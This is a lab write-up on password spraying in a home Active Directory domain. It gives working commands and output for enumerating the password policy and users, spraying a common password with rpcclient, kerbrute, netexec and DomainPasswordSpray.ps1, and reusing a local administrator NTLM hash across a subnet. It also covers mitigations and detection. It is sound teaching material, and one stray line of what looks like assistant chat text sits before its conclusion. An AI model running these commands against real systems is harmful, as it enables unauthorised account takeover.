

## General Description of the Technique

Password spraying (Password Spraying) can result in initial access to systems and potentially to a target network. This attack involves logging into an exposed service such as RDP, WinRM, SMB, SSH, among others, using a single common password against a broad list of usernames or email addresses.

Unlike traditional brute force, where many passwords are tested against a single user, in password spraying a single password is tested against multiple users, which significantly reduces the risk of account lockouts and immediate detection.

---

## Practical Example

Imagine you are performing a test on a Windows host within a controlled lab scenario (white box assessment). You only have access to the internal network and you manage to obtain a list of valid domain users, either through public sources such as LinkedIn or by using public GitHub dictionaries (for example, jsmith.txt).

After that, you validate those users using tools like Kerbrute to confirm which ones exist in the domain. Once the valid users are identified, you select a common password — for example, _Welcome1_ or some typical corporate temporary password — and test it against all users in the list.

Suppose that out of 10 users, 3 use the same password. At that point, authenticated access to the domain has already been obtained through those compromised accounts.

From that initial access, the attacker can begin an internal enumeration phase using tools such as:

- BloodHound (for relationship and privilege analysis)
    
- PowerView
    
- ActiveDirectory Module in PowerShell
    

The goal at this stage is to identify misconfigurations, excessive permissions, insecure delegations, or privilege relationships that allow escalation toward accounts with higher privileges within the domain.

---

## Non-Technical Example

Imagine you are in a hotel and they give you the access key to your room.  
Because of a system error, you discover that the same key can also open five other rooms occupied by different guests.

This means a single key works for multiple doors, when in reality each room should have unique and exclusive access.

That is how password spraying works: the same common password is tested against multiple users, and if several share that password, a single credential can provide access to multiple accounts.

Password spraying shows that it is not always necessary to exploit complex vulnerabilities; password reuse and weak configurations can be enough to gain initial access and later compromise the entire environment.

---

## Enumeration and Retrieval of Password Policies

**Password Policy Enumeration – From Linux – With Credentials**

We can extract the domain password policy in several ways, depending on how the environment is configured and whether we do or do not have valid domain credentials.

If we have valid credentials, it is possible to query the password policy remotely using tools such as **Netexec** or **rpcclient**, among others.

The information we want to obtain includes:

- Minimum password length
    
- Complexity enabled or disabled
    
- Account lockout threshold (Account Lockout Threshold)
    
- Lockout duration
    
- Counter reset time for attempts
    

These values are fundamental before performing password spraying, because they allow us to determine the risk of locking accounts during the attack.

```
 netexec smb 192.168.0.11 -u agarcia -p 'Spring2026!' -d krav0.local --pass-pol | sed 's/^.*DC01[[:space:]]*//'      
     
 (domain:krav0.local) (signing:True) (SMBv1:True) (Null Auth:True)
[+] krav0.local\agarcia:Spring2026! 
[+] Dumping password info for domain: KRAV0
Minimum password length: 8
Password history length: 5
Maximum password age: 89 days 23 hours 54 minutes 

Password Complexity Flags: 000001
Domain Refuse Password Change: 0
Domain Password Store Cleartext: 0
Domain Password Lockout Admins: 0
Domain Password No Clear Change: 0
Domain Password No Anon Change: 0
Domain Password Complex: 1

Minimum password age: None
Reset Account Lockout Counter: 1 hour 
Locked Account Duration: 1 hour 
Account Lockout Threshold: 6
Forced Log off Time: Not Set
```

---

## Password Policy Enumeration from Linux – SMB NULL Sessions

Without credentials, it is possible that we can enumerate the password policy through an **SMB NULL** session or through an anonymous LDAP bind, depending on how the domain is configured.

SMB NULL sessions allow an unauthenticated attacker to enumerate certain domain information, such as:

- User lists
    
- Groups
    
- Domain computers
    
- Account attributes
    
- Domain password policies
    

This type of configuration is usually associated with legacy environments or domain controllers that have been upgraded from older Windows Server versions, where some insecure options were enabled by default.

In modern Windows Server versions (such as 2016 and above), these configurations are normally disabled for security reasons. However, in misconfigured environments they can still be found enabled.

We can perform this type of enumeration using tools such as:

- `rpcclient`
    
- `netexec`
    
- `enum4linux`
    
- `ldapsearch`
    

---

# Password Policy Enumeration – From Linux

## Using rpcclient

```bash
rpcclient -U "" -N <IP>
```

Inside the interactive prompt:

```
rpcclient $> getdompwinfo
```

Output obtained:

```
min_password_length: 8
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

Using the `getdompwinfo` command it is possible to retrieve basic information about the domain password policy. In this case we observe that:

- The minimum length is 8 characters.
    
- Complexity is enabled (`DOMAIN_PASSWORD_COMPLEX`).
    

Although a minimum password length of 8 characters may seem adequate, it is still susceptible to attacks such as Password Spraying if users reuse common passwords that meet the minimum requirements.

---

## Using Enum4Linux

```bash
enum4linux -P <IP>
```

Relevant output:

```
[+] Minimum password length: 8
[+] Password history length: 5
[+] Maximum password age: 89 days 23 hours 54 minutes 
[+] Password Complexity Flags: 000001
[+] Minimum password age: None
[+] Reset Account Lockout Counter: 1 hour 
[+] Locked Account Duration: 1 hour 
[+] Account Lockout Threshold: 6
```

From the output we can analyze:

- Minimum length: 8
    
- Password history length: 5
    
- Complexity enabled
    
- Lockout threshold: 6 attempts
    
- Lockout duration: 1 hour
    

This threshold allows password spraying to be performed in a controlled way, avoiding multiple consecutive attempts on the same account.

---

# Enumeration from Linux – LDAP Anonymous Bind

Anonymous LDAP binds allow unauthenticated users to retrieve domain information, including attributes related to the password policy.

In modern Windows Server versions (since 2003 onward), anonymous LDAP access is usually restricted. However, in misconfigured environments it may be possible to obtain relevant information.

Command used:

```bash
ldapsearch -H ldap://192.168.0.11 -x -b "DC=KRAV0,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Output obtained:

```
lockoutThreshold: 6
maxPwdAge: -77760000000000
minPwdAge: 0
minPwdLength: 8
pwdProperties: 1
pwdHistoryLength: 5
```

From LDAP we can observe:

- `lockoutThreshold: 6`
    
- `minPwdLength: 8`
    
- `pwdHistoryLength: 5`
    
- `pwdProperties: 1` (complexity enabled)
    

These values match the policy configured in the domain.

---

# Enumeration of NULL Sessions – From Windows

Although it is less common to perform this type of enumeration from Windows, it is possible to establish a null session using:

```cmd
net use \\DC01\ipc$ "" /u:""
```

If the command returns:

```
The command completed successfully.
```

It means the null session was established successfully.

---

## Common Errors During Authentication

### Disabled account

```cmd
net use \\DC01\ipc$ "" /u:guest
```

```
System error 1331 has occurred.
This user can't sign in because this account is currently disabled.
```

---

### Incorrect password

```cmd
net use \\DC01\ipc$ "password" /u:guest
```

```
System error 1326 has occurred.
The user name or password is incorrect.
```

---

### Locked account

```cmd
net use \\DC01\ipc$ "password" /u:guest
```

```
System error 1909 has occurred.
The referenced account is currently locked out and may not be logged on to.
```

---

# Password Policy Enumeration – From Windows

If we manage to authenticate in the domain from a Windows host, we can use built-in binaries such as `net.exe` to retrieve the domain password policy. It is also possible to use tools such as PowerView, SharpMapExec, or SharpView to obtain more detailed information.

## Using net.exe

The command used is:

```
net accounts /domain`
```

<img src="/budahacksecurity/uploads/md_images/pspraying/password.png" style="max-width:100%; border-radius:8px;">

This command allows retrieving relevant information about the domain security configuration, including:

- Minimum password length
    
- Maximum and minimum password age
    
- Account lockout threshold
    
- Lockout duration
    
- Counter reset window
    

---

# Password Policy Analysis – KRAV0.LOCAL

Now that we have obtained the password policy through different methods (SMB, LDAP, and from Windows authenticated), we will analyze the configuration of the domain **KRAV0.LOCAL** point by point.

## Observed configuration

- Minimum password length: 8 characters
    
- Password history length: 5
    
- Maximum password age: ~89 days
    
- Minimum password age: 0
    
- Account lockout threshold: 6 attempts
    
- Lockout duration: 1 hour
    
- Reset counter after: 1 hour
    
- Password complexity: enabled
    

---

## Technical Analysis

### Minimum length: 8 characters

A minimum length of 8 characters is common in many organizations. Although it meets basic standards, nowadays many companies require between 10 and 14 characters to increase resistance against brute force attacks.

However, increasing the minimum length does not eliminate the risk of Password Spraying if users reuse common passwords that meet complexity requirements.

---

### Lockout threshold: 6 attempts

The domain allows up to 6 failed attempts before locking the account. This means a spraying attack must be performed in a controlled way.

An attacker can:

- Try one common password against multiple users.
    
- Avoid multiple consecutive attempts on the same account.
    
- Wait for the reset window if necessary.
    

This value is not unusual; some organizations configure 3 attempts, while others even disable lockout.

---

### Lockout duration: 1 hour

If an account is locked, it will remain locked for 1 hour.

This has important implications:

- An accidental lockout can generate alerts.
    
- In some organizations unlocking is manual, increasing visibility.
    
- In this environment, unlocking is automatic after the configured time.
    

During password spraying, it is critical to avoid lockouts to reduce noise.

---

### Complexity enabled

The policy requires the password to meet complexity requirements (3 out of 4 categories):

- Uppercase letters
    
- Lowercase letters
    
- Numbers
    
- Special characters
    

Passwords such as:

- `Password1`
    
- `Welcome1`
    
- `Spring2026!`
    

Technically satisfy complexity, but remain weak if multiple users reuse them.

---

## Conclusion of the Analysis

The KRAV0.LOCAL domain policy is not inherently weak. It meets common standards:

- Minimum length of 8
    
- Complexity enabled
    
- Lockout threshold configured
    

However, having an adequate policy does not eliminate the risk if users reuse common passwords.

The real risk in a Password Spraying scenario does not lie only in the policy configuration, but in user behavior and the lack of additional mechanisms such as:

- Multi-factor authentication (MFA)
    
- Monitoring of distributed attempts
    
- Detection of anomalous patterns
    

---

## User List Creation

To successfully perform a Password Spraying attack, we must first have a list of valid domain users. There are multiple methods to collect this information, depending on the access level available.

Some common methods include:

- Leveraging an SMB NULL session (if allowed).
    
- Using tools like Kerbrute to validate usernames from public lists.
    
- Authenticated enumeration using credentials obtained previously.
    
- External collection (OSINT), such as corporate email patterns or public profiles.
    

Before starting any spraying attempt, it is essential to analyze the domain password policy, since:

- Minimum length
    
- Complexity
    
- Lockout threshold
    

Influence the attack strategy.

---

## Activity Logging and Tracking

During password spraying, you should always keep a detailed record of:

- Targeted accounts
    
- Domain controller used
    
- Date and time of the spray
    
- Password(s) attempted
    

This helps to:

- Avoid duplicating efforts.
    
- Prevent accidental lockouts.
    
- Correlate with customer logs in a professional engagement.
    

---

# User Enumeration via SMB NULL Session

If the environment allows it, it is possible to extract domain users using an anonymous session.

## Enum4Linux

```bash
enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Output obtained in KRAV0:

```
Administrator
Guest
krbtgt
DefaultAccount
jsmith
mjordan
agarcia
dtorres
pjacobs
```

---

## rpcclient

```bash
rpcclient -U "" -N <IP>
```

Inside the prompt:

```
enumdomusers
```

Output:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[jsmith] rid:[0x44f]
user:[mjordan] rid:[0x450]
user:[agarcia] rid:[0x451]
user:[dtorres] rid:[0x452]
user:[pjacobs] rid:[0x456]
```

---

## NetExec

```bash
netexec smb <IP> --users
```

Summarized output:

```
Administrator
Guest
krbtgt
DefaultAccount
jsmith
mjordan
agarcia
dtorres
pjacobs
```

This method is cleaner and easier to parse than enum4linux.

---

# User Collection via LDAP

If the domain allows LDAP queries (anonymous or authenticated), it is possible to retrieve users directly from the directory.

## ldapsearch

```bash
ldapsearch -H ldap://<IP> -x -b "DC=KRAV0,DC=LOCAL" -s sub "(&(objectClass=user))" \
| grep sAMAccountName: \
| cut -f2 -d" "
```

Output obtained:

```
Administrator
Guest
DefaultAccount
krbtgt
jsmith
mjordan
agarcia
dtorres
pjacobs
```

---

# User Enumeration with Kerbrute

Kerbrute uses the Kerberos pre-authentication mechanism to validate usernames without requiring full authentication.

This method:

- Does not generate Windows event ID 4625 (Logon Failure).
    
- Can be stealthier.
    
- Does not lock accounts during the username enumeration phase.
    

Example in KRAV0:

```bash
kerbrute userenum -d KRAV0.LOCAL --dc 192.168.0.11 jsmith.txt
```

Relevant output:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/11/26 - Ronnie Flathers @ropnop

2026/02/11 19:15:16 >  Using KDC(s):
2026/02/11 19:15:16 >  	192.168.0.11:88

2026/02/11 19:15:16 >  [+] VALID USERNAME:	jsmith@KRAV0.LOCAL
2026/02/11 19:15:16 >  [+] VALID USERNAME:	agarcia@KRAV0.LOCAL
2026/02/11 19:15:16 >  [+] VALID USERNAME:	mjordan@KRAV0.LOCAL
2026/02/11 19:15:16 >  [+] VALID USERNAME:	dtorres@KRAV0.LOCAL
2026/02/11 19:15:17 >  [+] VALID USERNAME:	pjacobs@KRAV0.LOCAL
2026/02/11 19:15:24 >  Done! Tested 48705 usernames (5 valid) in 8.237 seconds
```

This method allowed validating multiple usernames in only a few seconds.

It is important to note that even though enumeration does not generate logon failure events (4625), it may generate event ID 4768 if Kerberos event logging is enabled.

Once we have a list of valid usernames, it can be used to perform controlled password spraying.

---

# Internal Password Spraying – From Linux

Once we have obtained the list of valid domain users, we can proceed with the Password Spraying attack.

In this scenario, we will use several tools from a Linux host to test a common password against multiple accounts in the KRAV0.LOCAL domain.

Before executing the attack, it is important to remember:

- Know the lockout threshold (in this case 6 attempts).
    
- Avoid multiple consecutive attempts on the same account.
    
- Record each attempt performed.
    

---

## Password Spraying with rpcclient

`rpcclient` can be used to perform authentication attempts against the SMB service.

An important detail is that a successful login is not always obvious immediately. In many cases, the response that contains `Authority Name` indicates valid authentication.

The following Bash one-liner automates the attack:

```bash
for u in $(cat usuarios.txt); do 
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 192.168.0.11 | grep Authority; 
done
```

Output obtained:

```
Account Name: mjordan, Authority Name: KRAV0
Account Name: pjacobs, Authority Name: KRAV0
```

The accounts that return `Authority Name` correspond to valid credentials.

---

## Password Spraying with Kerbrute

Kerbrute uses the Kerberos protocol to perform authentication attempts.

Command used:

```bash
kerbrute passwordspray -d KRAV0.LOCAL --dc 192.168.0.11 usuarios.txt Welcome1
```

Relevant output:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/11/26 - Ronnie Flathers @ropnop

2026/02/11 19:28:27 >  Using KDC(s):
2026/02/11 19:28:27 >  	192.168.0.11:88

2026/02/11 19:28:27 >  [+] VALID LOGIN:	mjordan@krav0.local:Welcome1
2026/02/11 19:28:27 >  [+] VALID LOGIN:	pjacobs@krav0.local:Welcome1
```

Kerbrute is more efficient and can be stealthier in the username enumeration phase. However, during spraying, failed attempts do count as authentication attempts and can contribute to account lockouts.

---

## Password Spraying with NetExec

NetExec provides clearer and more structured output for this type of attack.

```bash
netexec smb 192.168.0.11 -u usuarios.txt -p Welcome1 --continue-on-success
```

Filtering only successful logins:

```bash
netexec smb 192.168.0.11 -u usuarios.txt -p Welcome1 --continue-on-success 
| grep "\[+\]" | cut -d ']' -f2
```

Output:

```
krav0.local\mjordan:Welcome1
krav0.local\pjacobs:Welcome1
```

This method is more direct and easier to interpret compared to rpcclient.

---

# Result Analysis

The attack identified two accounts reusing the password `Welcome1`.

Even though the domain policy enforces:

- Minimum length of 8 characters
    
- Complexity enabled
    
- Lockout threshold of 6 attempts
    

Reusing a common password allowed authenticated access to the domain without exploiting additional vulnerabilities.

This shows that the risk of Password Spraying does not depend exclusively on a weak policy, but on user behavior and the absence of additional controls such as:

- Multi-factor authentication (MFA)
    
- Monitoring of distributed attempts
    
- Detection of anomalous patterns
    

---

## Local Administrator Password Reuse

Internal spraying is not limited to domain accounts. If the NTLM hash or plaintext password of the local administrator on a machine is obtained, it is possible to attempt authentication against other hosts in the network.

In environments where the same local administrator password is reused across multiple systems, this can enable fast lateral movement.

---

If we recover the NTLM hash of the local administrator from a compromised machine, we can test it against other hosts using NetExec:

```bash
netexec smb 192.168.0.0/24 -u administrator -H <NTLM_HASH> --local-auth 
--continue-on-success
```

The `--local-auth` parameter indicates authentication will be performed against the local account on the target system and not against the domain.

If multiple hosts accept the same hash, password reuse is confirmed.

---

# Internal Password Spraying – From Windows

From a Windows host joined to the KRAV0.LOCAL domain, it is possible to perform Password Spraying using native tools or specialized scripts.

If we have valid authentication in the domain, we can use tools such as **DomainPasswordSpray.ps1**, which:

- Automatically generates the user list from Active Directory.
    
- Queries the domain password policy.
    
- Excludes accounts near lockout.
    
- Executes the attack in a controlled way.
    

---

## Using DomainPasswordSpray.ps1

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Relevant output:

```
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing users within 1 attempt of locking out from list.
[*] SUCCESS! User:mjordan Password:Welcome1
[*] SUCCESS! User:pjacobs Password:Welcome1
```

The tool automatically detects the lockout policy and adjusts the attack to minimize the risk of causing account lockouts.

---

## Alternative: Kerbrute from Windows

Kerbrute can also be executed from a compromised Windows host to perform user enumeration and spraying using Kerberos.

Although enumeration does not generate logon failure events (4625), failed attempts during spraying can still contribute to account lockouts.

---

# Mitigations Against Password Spraying

To reduce the risk of this type of attack, it is recommended to implement a defense-in-depth strategy.

### Multi-Factor Authentication (MFA)

Implementing MFA significantly reduces the effectiveness of Password Spraying, even if the password is correct.

### Principle of Least Privilege

Restrict access to applications only to users who truly need it.

### Separation of Privileged Accounts

Privileged users should have separate accounts for administrative tasks and everyday usage.

### Password Hygiene

- Use long passphrases instead of short passwords.
    
- Use password filters to block common words, seasons, months, and variations of the company name.
    
- Avoid password reuse between local and domain accounts.
    

### LAPS

To prevent local administrator password reuse, implement Microsoft LAPS or equivalent solutions.

---

# Detection

Some indicators of Password Spraying include:

- Multiple 4625 events in a short period.
    
- Increase of 4771 events (Kerberos pre-auth failed).
    
- Distributed attempts across different accounts.
    

It is recommended to correlate failed attempts within a defined time window to detect anomalous patterns.

---

# External Password Spraying

Password spraying is also common against Internet-exposed services such as:

- Microsoft 365
    
- Outlook Web Access
    
- VPN portals
    
- Citrix
    
- RDS services
    
- Web applications integrated with Active Directory
    

Combining MFA, active monitoring, and network segmentation significantly reduces the impact of this type of attack.

---

Perfect.  
Here is a **professional conclusion** to close the KRAV0 Password Spraying lab and then a **well-written academic note** mentioning HTB Academy properly and elegantly.

---

# Conclusion – KRAV0 Lab: Password Spraying

In this lab, we demonstrated how an Active Directory environment with an apparently adequate password policy can still be vulnerable to Password Spraying attacks.

Throughout the analysis, the following phases were performed:

- Password policy enumeration via SMB, LDAP, and native Windows tools.
    
- Valid user collection through multiple techniques.
    
- Password spraying from Linux and from Windows.
    
- Identification of valid credentials without exploiting technical vulnerabilities.
    
- Impact analysis and possible mitigations.
    

The result shows that security does not depend only on password policy configuration, but also on user behavior, credential reuse, and the absence of additional controls such as MFA and proper monitoring.

The KRAV0.LOCAL domain had:

- Adequate minimum password length.
    
- Complexity enabled.
    
- A configured lockout threshold.
    

However, the reuse of a common password allowed authenticated access to the domain.

This demonstrates that Password Spraying continues to be an effective technique in real environments when no additional protective controls exist.

---

## Note

The technical information used to understand the concepts and methodologies was studied from the **Active Directory Enumeration** module in Hack The Box Academy.

This documentation has been written based on my own lab environment (KRAV0.LOCAL) and explained according to my practical understanding of the topic.

For those who want to learn more deeply about the theory and additional scenarios, it is recommended to review the corresponding module in HTB Academy.

---

## Lab Available

If you want to test your understanding of the Password Spraying technique in Active Directory, you can download the lab used in this documentation.

The environment includes:

- Configured domain controller.
    
- Defined password policy.
    
- Users created for testing.
    
- A scenario prepared for enumeration and password spraying.
    

Download link:

```
https://mega.nz/file/nRgnFCjK#eo_6D4gH25vGdHjh6ZioeN4nqIkbhzA16e1HQfZp_xQ
```

---